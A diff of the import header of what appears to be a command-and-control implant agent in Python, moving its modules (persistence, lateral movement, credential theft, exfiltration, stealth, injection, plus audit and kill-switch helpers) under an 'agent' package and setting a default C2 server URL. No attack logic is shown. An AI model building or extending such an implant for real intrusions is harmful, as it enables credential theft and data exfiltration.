@@ -1,13 +1,13 @@
 import asyncio, json, os, platform, hashlib, time, uuid, base64, sys, re
-from crypto import decrypt, generate_keypair
+from agent.crypto import decrypt, generate_keypair
 import httpx
-from modules.persistence import Persistence
-from modules.lateral import LateralMovement
-from modules.credtheft import CredentialTheft
-from modules.exfil import Exfiltration
-from modules.stealth import Stealth as AdvancedStealth
-from modules.inject import Injector
-from modules.audit import setup_agent_safety, KillSwitch, AuditLogger, IntegrityMonitor, ForensicCollector
+from agent.modules.persistence import Persistence
+from agent.modules.lateral import LateralMovement
+from agent.modules.credtheft import CredentialTheft
+from agent.modules.exfil import Exfiltration
+from agent.modules.stealth import Stealth as AdvancedStealth
+from agent.modules.inject import Injector
+from agent.modules.audit import setup_agent_safety, KillSwitch, AuditLogger, IntegrityMonitor, ForensicCollector
 
 C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
 INTERVAL = 30
